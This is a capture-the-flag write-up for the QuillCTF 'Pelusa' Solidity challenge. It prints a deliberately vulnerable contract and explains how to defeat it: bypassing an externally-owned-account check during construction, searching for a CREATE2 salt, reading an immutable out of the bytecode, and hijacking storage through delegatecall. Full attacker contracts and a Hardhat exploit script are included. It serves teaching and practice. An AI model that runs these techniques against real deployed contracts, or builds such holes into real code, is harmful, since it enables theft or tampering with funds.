# QuillCTF 8: Pelusa

> You just opened your eyes and are in Mexico 1986; help Diego set the score from 1 to 2 goals for a win, and do whatever is necessary!

**Objective of CTF:**

- Score from 1 to 2 goals for a win (i.e. increment the `goals` variable).

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IGame {
  function getBallPossesion() external view returns (address);
}

contract Pelusa {
  address private immutable owner;
  address internal player;
  uint256 public goals = 1;

  constructor() {
    owner = address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number))))));
  }

  function passTheBall() external {
    require(msg.sender.code.length == 0, "Only EOA players");
    require(uint256(uint160(msg.sender)) % 100 == 10, "not allowed");

    player = msg.sender;
  }

  function isGoal() public view returns (bool) {
    // expect ball in owners posession
    return IGame(player).getBallPossesion() == owner;
  }

  function shoot() external {
    require(isGoal(), "missed");
    (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature("handOfGod()"));
    require(success, "missed");
    require(uint256(bytes32(data)) == 22_06_1986);
  }
}
```

## The Attack

There are several points to cover here:

- First of all, we need to implement a contract to be the `player`. This contract must have code-size 0!
- Furthermore, when the address is looked at in modulo 100, it must return 10. This means that the contract address msut be something chosen by us somehow.
- After the player is set, we can call `shoot` to make a delegate-call to our player contract. There, it will handle this call within `handOfGod()` function.
- We must access the `owner` immutable variable to give it to our contract.

We will tackle these one by one.

### Code Size 0

The solution to having a contract with code-size 0 is to make the call during it's construction phase! Since a code that runs within `constructor` is not deployed to the chain yet, i.e. it lives in calldata rather than memory, it will have code-size 0.

### Address modulo 10

How can we generate a contract with the desired address? Well, a naive solution could be to deploy many contracts until you have your desired address, in this case one that results in 10 in mod 100.

However, we got neither time nor gas for that. So, `CREATE2` comes into rescue! With `CREATE2`, we can deploy a contract with an additional salt to be used in address generation. Since we can give this salt whatever we like, we can choose one specific salt so that the address result in one such that it results in 10 mod 100.

Note that the probability of a randomly generated number being congruent to 10 modulo 100 is around 1/100. So our expected probability of generating a correct contract is about 100 tries.

### Hand of God

Our contract will handle the `handOfGod` delegate call. Delegate call's operate on the context of the caller contract, while running the code at the target contract. So, we actually have access to all storage variables during `handOfGod`, and we can simply set `goals` to be 2 to win the game.

Returning `22_06_1986` is not a problem, just write `return 22_06_1986;` and you are good to go.

### Immutable Owner

Immutable variables, introduced around compiler version 0.6, are variables that are set during the construction phase. However, the variable are not stored in storage, but instead their references within the bytecode are replaced with their computed value during deployment!

So, you can't simply read the storage to get the value of immutables, you must dive into the bytecode. This may sound like a needle-in-haystack issue, but thankfully we have a clue: `PUSH32`.

Immutable variable references are replaced with `PUSH32 <value>` within the bytecode, and there are not that many `PUSH32`'s within the code. Furthermore, in this contract the immutable value is an address, so we can expect a `PUSH32 <address>` where the address is a 32-byte value with 12-byte prepending zeros!

We can get the code via `getCode` function of ethers, and then look specifically for `PUSH32` followed by 12 bytes of zeros. Then, we will retrieve the remaining 20-bytes as the address.

```typescript
const code = await ethers.provider.getCode(contract.address);
// PUSH32 (code: 7f) followed by 12 bytes of zeros
const index = code.indexOf('7f000000000000000000000000');
const pushLine = code.slice(index, index + 66); // get the line
const ownerAddress = '0x' + pushLine.slice(26); // get remaining 20 bytes
expect(ownerAddress).to.be.properAddress;
```

This works for this challenge, but you can also do this manually by opening the code at <evm.codes/playground> and CTRL+F the string above within the code. You should expect to get just a single occurence for this challenge!

## Proof of Concept

Now, we can construct our attacker contract, along with contract that will deploy it with `CREATE2`.

```solidity
contract PelusaAttacker is IGame {
  address public owner;
  uint256 goals;

  constructor(address owner_, address target_) {
    owner = owner_; // read from private storage of target
    Pelusa(target_).passTheBall(); // become the player
  }

  function getBallPossesion() external view override returns (address) {
    return owner;
  }

  function handOfGod() external returns (uint256) {
    goals = 2; // wins via delegatecall storage collision
    return 22_06_1986;
  }
}
```

The contract implementation is rather straightforward: call `passTheBall` during construction phase and then you will become the player. Below is the contract to deploy the one above:

```solidity
contract PelusaAttackerDeployer {
  address public deployment;
  address immutable target;

  constructor(address target_) {
    target = target_;
  }

  // will check the address requirement and create the contract with Create2
  function deployAttacker(address _owner, bytes32 _salt) external {
    address addr = address(new PelusaAttacker{salt: _salt}(_owner, target));
    require(uint256(uint160(addr)) % 100 == 10, "bad address");
    deployment = addr;
  }
}
```

This deployer will take a salt parameter given by us, but it will also make sure it matched the requirement, to save gas in case it is wrong. Once it is successful, we can read the deployed address via the public `deployment` variable.

Below is the Hardhat code to execute the attack:

```typescript
describe('QuillCTF 8: Pelusa', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let contract: Pelusa;
  let attackerDeployer: PelusaAttackerDeployer;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers.getContractFactory('Pelusa', owner).then(f => f.deploy());
    await contract.deployed();

    expect(await contract.goals()).to.eq(1);
  });

  it('should score a goal', async () => {
    // should deploy
    attackerDeployer = await ethers
      .getContractFactory('PelusaAttackerDeployer', attacker)
      .then(f => f.deploy(contract.address));
    await attackerDeployer.deployed();

    // immutables are stored directly within bytecode, rather than storage
    // we have to parse it from the bytecode
    // address can be found by analyzing the code at evm.codes/playground
    // or you can parse as follows
    const code = await ethers.provider.getCode(contract.address);
    const index = code.indexOf('7f000000000000000000000000'); // PUSH32 followed by 12byte zeros
    const pushLine = code.slice(index, index + 66);
    const ownerAddress = '0x' + pushLine.slice(26);
    expect(ownerAddress).to.be.properAddress;

    // randomly find the salt
    for (let i = 0; i < 2500; i++) {
      const s = ethers.utils.randomBytes(32);
      try {
        await attackerDeployer.connect(attacker).deployAttacker(ownerAddress, s);
        // console.log('Attempt:', i, '\tSalt:', Buffer.from(s).toString('hex'));
        break;
        // eslint-disable-next-line no-empty
      } catch (err) {}
    }
    // ensure deployment went right
    expect(await attackerDeployer.deployment()).to.not.eq(ethers.constants.AddressZero);

    // score the goal!
    await contract.connect(attacker).shoot();
  });

  after(async () => {
    expect(await contract.goals()).to.eq(2);
  });
});
```
